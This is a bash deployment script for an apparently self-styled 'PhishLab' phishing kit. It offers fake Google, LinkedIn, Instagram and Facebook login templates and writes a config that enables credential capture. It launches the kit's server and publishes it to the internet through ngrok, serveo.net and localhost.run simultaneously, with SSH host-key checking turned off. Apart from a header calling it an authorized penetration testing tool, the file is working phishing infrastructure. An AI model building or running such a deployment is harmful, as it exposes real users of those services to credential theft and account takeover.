#!/bin/bash
# =============================================================================
# PhishLab - Automated deployment with public URL tunneling
# Authorized penetration testing tool
# =============================================================================

set -euo pipefail

PORT=${1:-8080}
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
TEMPLATE=""
PHISH_PID=""
NGROK_PID=""
SSH_PID=""
SSH_PID2=""

cleanup() {
    echo ""
    echo "[*] Shutting down..."
    kill "$PHISH_PID" 2>/dev/null || true
    kill "$NGROK_PID" 2>/dev/null || true
    kill "$SSH_PID" 2>/dev/null || true
    kill "$SSH_PID2" 2>/dev/null || true
    pkill -f "ngrok" 2>/dev/null || true
    fuser -k "${PORT}/tcp" 2>/dev/null || true
    echo "[*] Done."
    exit 0
}
trap cleanup SIGINT SIGTERM EXIT

# ---------------------------------------------------------------------------
# Header
# ---------------------------------------------------------------------------
echo ""
echo "╔══════════════════════════════════════════════════════╗"
echo "║              PhishLab - Setup & Deploy               ║"
echo "║         Authorized Penetration Testing Tool          ║"
echo "╚══════════════════════════════════════════════════════╝"
echo ""

# ---------------------------------------------------------------------------
# Template selection
# ---------------------------------------------------------------------------
echo "Available templates:"
echo "  1) custom"
echo "  2) google"
echo "  3) linkedin"
echo "  4) instagram"
echo "  5) facebook"
echo ""

while true; do
    read -rp $'Select template (1-5): ' CHOICE
    case "$CHOICE" in
        1) TEMPLATE="custom"; break ;;
        2) TEMPLATE="google"; break ;;
        3) TEMPLATE="linkedin"; break ;;
        4) TEMPLATE="instagram"; break ;;
        5) TEMPLATE="facebook"; break ;;
        *) echo "Invalid selection, try again." ;;
    esac
done

echo ""
echo "[*] Template : $TEMPLATE"
echo "[*] Port     : $PORT"
echo ""

# ---------------------------------------------------------------------------
# Python virtual environment
# ---------------------------------------------------------------------------
if [ ! -d "$SCRIPT_DIR/venv" ]; then
    echo "[*] Creating Python virtual environment..."
    python3 -m venv "$SCRIPT_DIR/venv"
fi

echo "[*] Installing dependencies..."
source "$SCRIPT_DIR/venv/bin/activate"
pip install -q flask requests 2>/dev/null

# ---------------------------------------------------------------------------
# Write config.json
# ---------------------------------------------------------------------------
echo "[*] Writing config.json..."
cat > "$SCRIPT_DIR/config.json" << EOF
{
  "server": {
    "host": "0.0.0.0",
    "port": $PORT,
    "ssl": false,
    "ssl_cert": "",
    "ssl_key": ""
  },
  "tunnel": {
    "enabled": false,
    "provider": "ngrok",
    "ngrok_auth_token": "",
    "cloudflare_api_token": ""
  },
  "campaign": {
    "template": "$TEMPLATE",
    "redirect_url": "https://www.instagram.com",
    "capture_credentials": true,
    "capture_otp": false,
    "log_ips": false,
    "log_user_agents": false,
    "log_geolocation": false
  }
}
EOF

# ---------------------------------------------------------------------------
# Start local server
# ---------------------------------------------------------------------------
echo "[*] Starting PhishLab server on port $PORT..."
python3 "$SCRIPT_DIR/phishkit.py" --template "$TEMPLATE" --port "$PORT" &
PHISH_PID=$!
sleep 3

# Verify server is running
if ! kill -0 "$PHISH_PID" 2>/dev/null; then
    echo "[!] FATAL: Server failed to start."
    exit 1
fi

# ---------------------------------------------------------------------------
# Public tunnels — run ALL providers simultaneously
# ---------------------------------------------------------------------------
echo ""
echo "[*] Establishing public tunnels..."
echo ""

# --- Method 1: ngrok ---
if command -v ngrok &>/dev/null; then
    echo "[*] Starting ngrok..."
    ngrok http "$PORT" --host-header=rewrite --log=stdout >/dev/null 2>&1 &
    NGROK_PID=$!
    sleep 4
    NGROK_URL=$(curl -s http://127.0.0.1:4040/api/tunnels 2>/dev/null \
        | python3 -c "import sys,json; t=json.load(sys.stdin).get('tunnels',[]); print(t[0]['public_url'] if t else '')" 2>/dev/null)
    if [ -n "$NGROK_URL" ]; then
        echo "[+] ngrok OK: $NGROK_URL"
    else
        echo "[-] ngrok: no URL obtained"
    fi
else
    echo "[-] ngrok: not installed"
    NGROK_URL=""
fi

# --- Method 2: serveo.net ---
echo "[*] Starting serveo.net..."
ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=30 \
    -R 80:localhost:"$PORT" serveo.net 2>/dev/null &
SSH_PID=$!
sleep 5
echo "[*] serveo.net started — check terminal output for URL"

# --- Method 3: localhost.run ---
echo "[*] Starting localhost.run..."
ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=30 \
    -R 80:localhost:"$PORT" nokey@localhost.run 2>/dev/null &
SSH_PID2=$!
sleep 5
echo "[*] localhost.run started — check terminal output for URL"

# ---------------------------------------------------------------------------
# Final status display
# ---------------------------------------------------------------------------
LOCAL_IP=$(hostname -I 2>/dev/null | awk '{print $1}')

echo ""
echo "=========================================="
echo "  PhishLab is RUNNING!"
echo "=========================================="
echo ""
echo "  Template    : $TEMPLATE"
echo "  Local URL   : http://127.0.0.1:$PORT"
echo "  Network URL : http://$LOCAL_IP:$PORT"
echo ""
if [ -n "$NGROK_URL" ]; then
    echo "  ngrok       : $NGROK_URL"
fi
echo "  serveo.net  : (check terminal output above)"
echo "  localhost.run: (check terminal output above)"
echo ""
echo "  [Ctrl+C to stop all services]"
echo "=========================================="
echo ""

# ---------------------------------------------------------------------------
# Wait for server to finish
# ---------------------------------------------------------------------------
wait "$PHISH_PID"
